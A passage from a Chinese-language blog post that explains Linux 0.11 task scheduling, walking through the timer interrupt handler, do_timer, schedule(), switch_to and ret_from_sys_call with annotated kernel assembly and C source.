EFLAGS, CS, EIP, (Error Code) 。</p><p>然后将正式进入到 IDT 定位的时钟中断处理逻辑的开始位置 (当然了，到这里也还是在保存现场。毕竟还有好多寄存器的数据要保存的)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.align 4</span><br><span class="line">_timer_interrupt:</span><br><span class="line">push %ds# save ds,es and put kernel data space</span><br><span class="line">push %es# into them. %fs is used by _system_call</span><br><span class="line">push %fs</span><br><span class="line">pushl %edx# we save %eax,%ecx,%edx as gcc doesn&apos;t</span><br><span class="line">pushl %ecx# save those across function calls. %ebx</span><br><span class="line">pushl %ebx# is saved as we use that in ret_sys_call</span><br><span class="line">pushl %eax</span><br><span class="line">movl $0x10,%eax # 0x10 是内核数据段选择符，即 GDT 第二项</span><br><span class="line">mov %ax,%ds</span><br><span class="line">mov %ax,%es</span><br><span class="line">movl $0x17,%eax # 0x17 是当前任务数据段选择符，LDT 第二项 (区分选择符是使用 GDT or LDT ，看 val &amp; 0x4 的结果，如果为 1 使用 LDT，否则 GDT</span><br><span class="line">mov %ax,%fs</span><br><span class="line">incl _jiffies   # 反正每次时钟中断 +1 ，想不到合适的中文翻译</span><br><span class="line">movb $0x20,%al# EOI to interrupt controller #1 发送指令请求硬件结束这次时钟中断的报告</span><br><span class="line">outb %al,$0x20</span><br><span class="line">movl CS(%esp),%eax  # 这个 CS 是个常量，取出内核栈暂存的原来正在执行的任务的代码段选择符</span><br><span class="line">andl $3,%eax# %eax is CPL (0 or 3, 0=supervisor)    判断一下在中断开始前代码的特权级 0 是内核态，3 是用户态</span><br><span class="line">pushl %eax</span><br><span class="line">call _do_timer# 调用 do_timer(long CPL) 。真正的处理时钟中断</span><br><span class="line">addl $4,%esp# task switching to accounting ...</span><br><span class="line">jmp ret_from_sys_call</span><br></pre></td></tr></table></figure><h3 id="任务调度-do-timer"><a href="#任务调度-do-timer" class="headerlink" title="任务调度 do_timer"></a>任务调度 do_timer</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_timer</span><span class="params">(<span class="keyword">long</span> cpl)</span>     <span class="comment">/* 这个 cpl 是上一小节获取的原任务正在执行的指令的特权级 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">int</span> beepcount;       <span class="comment">/* 扬声器发声计数 */</span></span><br><span class="line">    <span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">sysbeepstop</span><span class="params">(<span class="keyword">void</span>)</span></span>;  <span class="comment">/* 关闭扬声器的函数声明 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (beepcount)              <span class="comment">/* 这段逻辑作用很不清晰，可能是富有年代感的产物 */</span></span><br><span class="line">        <span class="keyword">if</span> (!--beepcount)</span><br><span class="line">            sysbeepstop();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cpl)                    <span class="comment">/* 判断特权级 然后给当前任务的用户态/内核态用时计数 */</span></span><br><span class="line">        current-&gt;utime++;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        current-&gt;stime++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 这段逻辑是给操作系统定时任务用的，用兴趣的欢迎自己学习 */</span></span><br><span class="line">    <span class="keyword">if</span> (next_timer) &#123;</span><br><span class="line">        next_timer-&gt;jiffies--;</span><br><span class="line">        <span class="keyword">while</span> (next_timer &amp;&amp; next_timer-&gt;jiffies &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">void</span> (*fn)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line">            fn = next_timer-&gt;fn;</span><br><span class="line">            next_timer-&gt;fn = ((<span class="keyword">void</span> *) <span class="number">0</span>);</span><br><span class="line">            next_timer = next_timer-&gt;next;</span><br><span class="line">            (fn)();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (current_DOR &amp; <span class="number">0xf0</span>)</span><br><span class="line">        do_floppy_timer();</span><br><span class="line">    <span class="keyword">if</span> ((--current-&gt;counter)&gt;<span class="number">0</span>) <span class="keyword">return</span>;     <span class="comment">/* 分配给当前任务的时间片 -1 。如果不为0，那么直接退出时钟中断，让任务继续执行 */</span></span><br><span class="line">    current-&gt;counter=<span class="number">0</span>;     <span class="comment">/* 否则，当前任务的时间片记为 0 */</span></span><br><span class="line">    <span class="keyword">if</span> (!cpl) <span class="keyword">return</span>;       <span class="comment">/* 如果当前任务正处于内核态(比如用户程序中使用了一些系统调用)，那么先让这个任务继续执行，避免任务切换引起的麻烦 */</span></span><br><span class="line">    schedule();             <span class="comment">/* 任务调用，决定下一个时间片的主人 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="任务调度-schedule"><a href="#任务调度-schedule" class="headerlink" title="任务调度 schedule()"></a>任务调度 schedule()</h3><p>schedule() 就开始对 CPU 之后要把时间片分配给哪个任务做一次决策了。</p><p>但是，在开始之前，我们有必要先了解一下结构体 task_struct </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"><span class="keyword">long</span> state;<span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line"><span class="keyword">long</span> counter;</span><br><span class="line"><span class="keyword">long</span> priority;</span><br><span class="line"><span class="keyword">long</span> signal;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sigaction</span>[32];</span></span><br><span class="line"><span class="keyword">long</span> blocked;<span class="comment">/* bitmap of masked signals */</span></span><br><span class="line"><span class="comment">/* various fields */</span></span><br><span class="line"><span class="keyword">int</span> exit_code;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> start_code,end_code,end_data,brk,start_stack;</span><br><span class="line"><span class="keyword">long</span> pid,father,pgrp,session,leader;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> uid,euid,suid;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> gid,egid,sgid;</span><br><span class="line"><span class="keyword">long</span> alarm;</span><br><span class="line"><span class="keyword">long</span> utime,stime,cutime,cstime,start_time;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> used_math;</span><br><span class="line"><span class="comment">/* file system info */</span></span><br><span class="line"><span class="keyword">int</span> tty;<span class="comment">/* -1 if no tty, so it must be signed */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> umask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">pwd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">root</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">executable</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> close_on_exec;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">filp</span>[<span class="title">NR_OPEN</span>];</span></span><br><span class="line"><span class="comment">/* ldt for this task 0 - zero 1 - cs 2 - ds&amp;ss */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>[3];</span></span><br><span class="line"><span class="comment">/* tss for this task */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> <span class="title">tss</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>匆匆一瞥，不过是不是觉得有些变量名还是很熟悉的，比如说 priority, utime, uid, eid, gid 等等。<br>但是暂时还用不上这么多。只要有个概念就好。操作系统通过上述这些值共同维护起了一个任务的方方面面的信息。</p><p>其中，需要再次注意的是，Linux0.11 版本最多只支持 64 个任务 (这是硬编码决定的上限，因为这个 task_struct 结构实例只声明了 64 个)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  'schedule()' is the scheduler function. This is GOOD CODE! There</span></span><br><span class="line"><span class="comment"> * probably won't be any reason to change this, as it should work well</span></span><br><span class="line"><span class="comment"> * in all circumstances (ie gives IO-bound processes good response etc).</span></span><br><span class="line"><span class="comment"> * The one thing you might take a look at is the signal-handler code here.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   NOTE!!  Task 0 is the 'idle' task, which gets called when no other</span></span><br><span class="line"><span class="comment"> * tasks can run. It can not be killed, and it cannot sleep. The 'state'</span></span><br><span class="line"><span class="comment"> * information in task[0] is never used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">schedule</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,next,c;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> ** <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check alarm, wake up any interruptible tasks that have got a signal */</span></span><br><span class="line"><span class="comment">/* 检测 alarm (任务定时报警信号)，并唤醒可中断的任务来完成预定义的工作, 好像自己用得少，还不太了解 alarm(xxx) 的细节</span></span><br><span class="line"><span class="comment"> * 从任务 63 号开始(总共 64 个任务, 0~63) ，倒着遍历所有任务，检测 alarm </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line"><span class="keyword">if</span> (*p) &#123;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;alarm &amp;&amp; (*p)-&gt;alarm &lt; jiffies) &#123;</span><br><span class="line">(*p)-&gt;signal |= (<span class="number">1</span>&lt;&lt;(SIGALRM<span class="number">-1</span>));</span><br><span class="line">(*p)-&gt;alarm = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (((*p)-&gt;signal &amp; ~(_BLOCKABLE &amp; (*p)-&gt;blocked)) &amp;&amp;</span><br><span class="line">(*p)-&gt;state==TASK_INTERRUPTIBLE)</span><br><span class="line">(*p)-&gt;state=TASK_RUNNING;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* this is the scheduler proper: */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">c = <span class="number">-1</span>;</span><br><span class="line">next = <span class="number">0</span>;</span><br><span class="line">i = NR_TASKS;   <span class="comment">/* 这里的宏 NR_TASKS = 64 */</span></span><br><span class="line">p = &amp;task[NR_TASKS];</span><br><span class="line"><span class="keyword">while</span> (--i) &#123;</span><br><span class="line"><span class="keyword">if</span> (!*--p)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">/* 选择任务状态为 就绪态，且 counter 值最大的任务号作为下一个占用 CPU 的任务</span></span><br><span class="line"><span class="comment">if ((*p)-&gt;state == TASK_RUNNING &amp;&amp; (*p)-&gt;counter &gt; c) </span></span><br><span class="line"><span class="comment">c = (*p)-&gt;counter, next = i;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">        /* 如果没有其它任务，那么 next = 0 ，即接下来占用 cpu 的任务就是 0号任务(0号任务一定存在，不能被 kill ) */</span></span><br><span class="line"><span class="keyword">if</span> (c) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">/* 如果 1~63 号任务(不存在或不在就绪态)至少存在一个任务，且时间片都为 0 ，那么重新计算分配给每个任务的 counter 值 */</span></span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line"><span class="keyword">if</span> (*p)</span><br><span class="line">(*p)-&gt;counter = ((*p)-&gt;counter &gt;&gt; <span class="number">1</span>) + (*p)-&gt;priority;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/* 将当前任务切换为 next ，然后就可以一切就绪，退出时钟中断，就变成新的占用cpu的任务来执行了 */</span></span><br><span class="line">switch_to(next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>switch_to(next)</strong></p><p>switch_to(next) 这个函数，是通过内嵌汇编写的。下面我们来看看细节(这里选用 GCC 编译出来的汇编指令，不直接使用内嵌汇编)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 这里的汇编指令紧跟在 if(c) break; 之后</span><br><span class="line">.L36:</span><br><span class="line">movl%ebx, %edx          # 这里 ebx 存储的是 next 变量的值，现在复制到 edx 上</span><br><span class="line">sall$4, %edx            # sall、addl 两行的目的是计算得到一个 TSS 选择符，TSS0 在 GDT 是第4项，TSS1 在 GDT 是第 6 项，类推...其中选择符后3位为DPL和 GDTR/LDTR 选项</span><br><span class="line">addl$32, %edx</span><br><span class="line">movl_task(,%ebx,4), %ecx    # 找到 next 号任务的 task_struct 的指针 (存储在 task[64] 的数组中)</span><br><span class="line">#APP</span><br><span class="line"># 141 &quot;sched.c&quot; 1</span><br><span class="line">cmpl %ecx,_current          # 确认是不是原任务</span><br><span class="line">je 1f                       # 是的话直接跳出 (跳到最近的标签 1 )</span><br><span class="line">movw %dx,8(%esp)</span><br><span class="line">xchgl %ecx,_current         # 交换 ecx 和 _current 存储的值</span><br><span class="line">ljmp 4(%esp)                # 通过间接跳转完成任务切换。通用的形式是 jmp CS:IP，但是使用间接跳转，在内存中的值先读取 32 位偏移量，再读 16 位段选择符</span><br><span class="line">cmpl %ecx,_last_task_used_math</span><br><span class="line">jne 1f</span><br><span class="line">clts                        # 清除 CR0 寄存器中的 TS Flag </span><br><span class="line">1:</span><br><span class="line"># 0 &quot;&quot; 2</span><br><span class="line">#NO_AP</span><br></pre></td></tr></table></figure><p>上面这段程序有必要将它割裂成两部分来看待，以 <code>ljmp 4(%esp)</code> 为界。</p><p><code>jmp</code> ，这是一个相当明显的程序跳转。这里 jmp 给出的选择符是 GDT 上某个任务的 TSS 描述符</p><p>通过 <code>jmp</code> CPU 将完成老的任务所有寄存器的保存现场，以及新的任务所有寄存器暂存结果的载入。</p><p>CPU 执行的下一条指令，将是新的任务 CS:EIP 所指明的指令。</p><p>相应的，<code>ljmp</code> 之后的指令将在该任务重新获得占用 CPU 后获得执行。</p><h2 id="任务调度的结束阶段"><a href="#任务调度的结束阶段" class="headerlink" title="任务调度的结束阶段"></a>任务调度的结束阶段</h2><p>这段就比较绕了，现在假设一个前提，就是任务 A 也是在时钟中断重新进行任务调度的时候被替换掉的，现在 CPU 分配的时间片又轮到了任务 A 。</p><p>也就是紧随着上一小节 <code>ljmp</code> 看看从任务内核态回到用户态的流程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    # 这段与上面一段指令是直接承接的</span><br><span class="line">movl12(%esp), %eax</span><br><span class="line">xorl%gs:20, %eax</span><br><span class="line">je.L40</span><br><span class="line">call___stack_chk_fail</span><br><span class="line">.L40:</span><br><span class="line">addl$24, %esp           # 这里返还这次 call 额外申请的内核栈空间</span><br><span class="line">.cfi_def_cfa_offset 8</span><br><span class="line">popl%ebx                # 恢复进入 call 的时候暂存的 ebx</span><br><span class="line">.cfi_restore 3</span><br><span class="line">.cfi_def_cfa_offset 4</span><br><span class="line">ret                         # return 跳转回到当初调用的地方</span><br><span class="line">.cfi_endproc</span><br></pre></td></tr></table></figure><p>还是从汇编指令来看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">call_schedule           # 原先调用 schedule() 的地方</span><br><span class="line">.L93:</span><br><span class="line">    # return 跳转回来，直接承接的指令</span><br><span class="line">addl$8, %esp</span><br><span class="line">.cfi_def_cfa_offset 8</span><br><span class="line">popl%ebx</span><br><span class="line">.cfi_restore 3</span><br><span class="line">.cfi_def_cfa_offset 4</span><br><span class="line">ret                         # 继续 return ，跳出 do_timer() </span><br><span class="line">.cfi_endproc</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   call _do_timer# &apos;do_timer(long CPL)&apos; does everything from</span><br><span class="line">addl $4,%esp# task switching to accounting ...</span><br><span class="line">jmp ret_from_sys_call</span><br></pre></td></tr></table></figure><p><strong>ret_from_sys_call</strong></p><p>这里就打算正式结束由于这次时钟中断所引发的内核态指令执行的流程，正式回归用户态了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">ret_from_sys_call:</span><br><span class="line">    # 这 3 行来判断是不是任务0，如果是就不进行信号量的处理了</span><br><span class="line">movl _current,%eax# task[0] cannot have signals</span><br><span class="line">cmpl _task,%eax</span><br><span class="line">je 3f</span><br><span class="line">    # 判断在发生时钟中断前，CS 表示的是不是 LDT 第 1 项 (局部变量表的代码段)</span><br><span class="line">    # 否则 CS 就应该内核态代码段了，不进行信号量处理</span><br><span class="line">cmpw $0x0f,CS(%esp)# was old code segment supervisor ?</span><br><span class="line">jne 3f</span><br><span class="line">    # 判断在发生时钟中断前，SS 表示的是不是 LDT 第 2 项 (局部变量表的数据段)</span><br><span class="line">    # 否则认为程序还处在内核态，不进行信号量处理</span><br><span class="line">cmpw $0x17,OLDSS(%esp)# was stack segment = 0x17 ?</span><br><span class="line">jne 3f</span><br><span class="line">    # 设置信号量 (不清楚，先挖个坑)</span><br><span class="line">movl signal(%eax),%ebx</span><br><span class="line">movl blocked(%eax),%ecx</span><br><span class="line">notl %ecx</span><br><span class="line">andl %ebx,%ecx</span><br><span class="line">bsfl %ecx,%ecx</span><br><span class="line">je 3f</span><br><span class="line">btrl %ecx,%ebx</span><br><span class="line">movl %ebx,signal(%eax)</span><br><span class="line">incl %ecx</span><br><span class="line">pushl %ecx</span><br><span class="line">call _do_signal</span><br><span class="line">popl %eax</span><br><span class="line">3:popl %eax</span><br><span class="line">popl %ebx</span><br><span class="line">popl %ecx</span><br><span class="line">popl %edx</span><br><span class="line">pop %fs</span><br><span class="line">pop %es</span><br><span class="line">pop %ds</span><br><span class="line">iret</span><br></pre></td></tr></table></figure><p>至此，通过 iret 将跳转回到用户态代码被中断的位置，并继续执行</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="pause"><a href="#pause" class="headerlink" title="pause()"></a>pause()</h3><p><a href="https://dormouse-none.github.io/2018-10-06-understand-Kernel-3/">Linux Kernel(3) - 操作系统启动</a> 中，描述过任务0在完成了整个操作系统的启动流程之后，唯一在做的事情，就是调用 <code>for(;;) pause();</code> </p><p>CPU 每次把时间片分配给它，它就开始浪费权力，直接不要了这个时间片。</p><p>之前一直以为 pause() 会选择执行 <code>HLT</code> 指令让 CPU 暂时地陷入停止状态。但是出乎意料，并不是这个结果(当然，最终是不是还是另一个说法。毕竟代码都是人写的，每个人都可以各自有一套实现)。</p><p>当 CPU 把执行指令的权力交个任务 0 时，选择让 CPU 停止，直到接收到硬件中断为止也不失为一种选择。当然，不论其它，Linux0.11版本的代码不是这样的。</p><p>通过 <code>INT 0x80</code> 配合系统调用函数查表，最后定位到的就是 sys_pause() 了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">_sys_pause:</span><br><span class="line">.LFB13:</span><br><span class="line">.cfi_startproc</span><br><span class="line">subl$12, %esp</span><br><span class="line">.cfi_def_cfa_offset 16</span><br><span class="line">movl_current, %eax</span><br><span class="line">movl$1, (%eax)</span><br><span class="line">call_schedule       # 调用 schedule() 重新划分时间片</span><br><span class="line">movl$0, %eax</span><br><span class="line">addl$12, %esp</span><br><span class="line">.cfi_def_cfa_offset 4</span><br><span class="line">ret</span><br><span class="line">.cfi_endproc</span><br></pre></td></tr></table></figure></p><h3 id="timer-定时器"><a href="#timer-定时器" class="headerlink" title="timer 定时器"></a>timer 定时器</h3><p>之前在 <code>do_timer()</code> 函数中也看过了每次时钟中断，都会检查一遍定时器，并决定是否触发预置的定时器处理函数。</p><p>当然了，既然是触发定时器，总是要有一个前提——设置定时器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_timer</span><span class="params">(<span class="keyword">long</span> jiffies, <span class="keyword">void</span> (*fn)(<span class="keyword">void</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> * <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!fn)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">cli();</span><br><span class="line"><span class="keyword">if</span> (jiffies &lt;= <span class="number">0</span>)</span><br><span class="line">(fn)();</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (p = timer_list ; p &lt; timer_list + TIME_REQUESTS ; p++)</span><br><span class="line"><span class="keyword">if</span> (!p-&gt;fn)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (p &gt;= timer_list + TIME_REQUESTS)</span><br><span class="line">panic(<span class="string">"No more time requests free"</span>);</span><br><span class="line">p-&gt;fn = fn;</span><br><span class="line">p-&gt;jiffies = jiffies;</span><br><span class="line">p-&gt;next = next_timer;</span><br><span class="line">next_timer = p;</span><br><span class="line"><span class="keyword">while</span> (p-&gt;next &amp;&amp; p-&gt;next-&gt;jiffies &lt; p-&gt;jiffies) &#123;</span><br><span class="line">p-&gt;jiffies -= p-&gt;next-&gt;jiffies;</span><br><span class="line">fn = p-&gt;fn;</span><br><span class="line">p-&gt;fn = p-&gt;next-&gt;fn;</span><br><span class="line">p-&gt;next-&gt;fn = fn;</span><br><span class="line">jiffies = p-&gt;jiffies;</span><br><span class="line">p-&gt;jiffies = p-&gt;next-&gt;jiffies;</span><br><span class="line">p-&gt;next-&gt;jiffies = jiffies;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">sti();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>对于任务调度，更难的是对一个时间断层的理解。在调度过程中，旧任务被暂停，新的任务被重新启动, 直到旧的任务又被启动。这里就必须人为地将被中断的任务主动的连接起来看待。</p><p>早期版本的任务调度模块确实比较简单，累计不过百行 C 代码。哈哈。一点一点继续来吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前面几节已经描述过，对于单核 CPU 来说。CPU 就处于不断地执行指令的过程(或者通过 &lt;code&gt;hlt&lt;/code&gt; 指令直接停止工作)。&lt;/p&gt;
&lt;p&gt;针对于每一个程序来说，这个程序执行流程是通过 CPU 中几组寄存器(通用寄存器、段寄存器、控制寄存器等) 和存储在内存中的代码和数据协作完成的。&lt;/p&gt;
